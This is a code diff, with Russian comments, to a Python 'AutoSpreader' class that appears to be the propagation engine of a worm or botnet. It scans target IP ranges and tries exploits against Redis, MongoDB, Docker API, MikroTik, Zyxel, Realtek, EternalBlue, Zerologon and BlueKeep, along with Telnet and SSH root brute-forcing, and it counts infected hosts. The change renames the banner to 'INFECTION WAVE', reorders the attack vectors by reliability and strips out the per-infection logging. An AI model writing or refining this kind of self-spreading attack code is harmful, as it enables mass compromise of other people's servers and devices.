@@ -54,7 +54,7 @@ class AutoSpreader:
         self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
         self.thread = threading.Thread(target=self._worker, daemon=True)
         self.thread.start()
-        self.message_queue.put("[System] STORM BREAKER запущен")
+        self.message_queue.put("[System] INFECTION WAVE запущен")
 
     def stop(self):
         self.running = False
@@ -69,35 +69,33 @@ class AutoSpreader:
             return False
         self.stats['open_ports'] += 1
         self.message_queue.put(f"[Ports] {ip} открыты: {ports}")
-        # Безпарольные сервисы и простые эксплойты в первую очередь
-        if 6379 in ports and await exploit_redis(ip):
-            self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (Redis)"); return True
-        if 27017 in ports and await exploit_mongodb(ip):
-            self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (MongoDB)"); return True
-        if 2375 in ports and await exploit_docker_api(ip):
-            self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (Docker)"); return True
+        # Порядок: самые надёжные векторы сначала
         if 8291 in ports and await exploit_mikrotik(ip):
-            self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (MikroTik)"); return True
+            self.stats['infected'] += 1; return True
         if 80 in ports:
             if await exploit_zyxel(ip):
-                self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (Zyxel)"); return True
+                self.stats['infected'] += 1; return True
             if await exploit_realtek(ip):
-                self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (Realtek)"); return True
-        # Telnet
+                self.stats['infected'] += 1; return True
+        if 6379 in ports and await exploit_redis(ip):
+            self.stats['infected'] += 1; return True
+        if 27017 in ports and await exploit_mongodb(ip):
+            self.stats['infected'] += 1; return True
+        if 2375 in ports and await exploit_docker_api(ip):
+            self.stats['infected'] += 1; return True
         for p in [23,2323]:
             if p in ports:
                 if (await telnet_bruteforce(ip, p))[0]:
-                    self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (Telnet)"); return True
-        # SSH
+                    self.stats['infected'] += 1; return True
         for p in [22,2222]:
             if p in ports:
                 if (await ssh_bruteforce(ip, 'root', p))[0]:
-                    self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (SSH)"); return True
+                    self.stats['infected'] += 1; return True
         if 445 in ports:
             if any(await asyncio.gather(exploit_eternalblue(ip), exploit_zerologon(ip))):
-                self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (SMB)"); return True
+                self.stats['infected'] += 1; return True
         if 3389 in ports and await exploit_bluekeep(ip):
-            self.stats['infected'] += 1; self.message_queue.put(f"[Infected] {ip} (BlueKeep)"); return True
+            self.stats['infected'] += 1; return True
         return False
 
     def _worker(self):
@@ -129,20 +127,7 @@ class AutoSpreader:
             self.stats['scanned'] += len(target_ips)
             self.message_queue.put(f"[Scan] {len(target_ips)} целей (всего просканировано: {self.stats['scanned']})")
             sem = asyncio.Semaphore(self.worker_threads)
-            completed = 0
-            total = len(target_ips)
-            async def attack(ip):
-                nonlocal completed
-                async with sem:
-                    await self.attack_target(ip)
-                    completed += 1
-                    if completed % max(1, total//10) == 0:
-                        pct = int(completed/total*100)
-                        self.message_queue.put(f"[Progress] ({pct}%)")
-                    # Каждые 10 целей отправляем промежуточную статистику
-                    if completed % 10 == 0:
-                        self.message_queue.put(f"[Live] Просканировано: {self.stats['scanned']}, Заражено: {self.stats['infected']}")
-            tasks = [attack(ip) for ip in target_ips]
+            tasks = [self.attack_target(ip) for ip in target_ips]
             loop.run_until_complete(asyncio.gather(*tasks))
             self.message_queue.put(f"[Stats] Проверено: {self.stats['scanned']} | Заражено: {self.stats['infected']}")
             time.sleep(self.interval)
@@ -157,18 +142,6 @@ class AutoSpreader:
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         sem = asyncio.Semaphore(min(self.worker_threads, len(target_list)))
-        completed = 0
-        total = len(target_list)
-        async def attack(ip):
-            nonlocal completed
-            async with sem:
-                await self.attack_target(ip)
-                completed += 1
-                if completed % max(1, total//10) == 0:
-                    pct = int(completed/total*100)
-                    self.message_queue.put(f"[Progress] ({pct}%)")
-                if completed % 10 == 0:
-                    self.message_queue.put(f"[Live] Просканировано: {self.stats['scanned']}, Заражено: {self.stats['infected']}")
-        tasks = [attack(ip) for ip in target_list]
+        tasks = [self.attack_target(ip) for ip in target_list]
         loop.run_until_complete(asyncio.gather(*tasks))
         self.message_queue.put(f"[Завершено] Обработано {len(target_list)} целей")
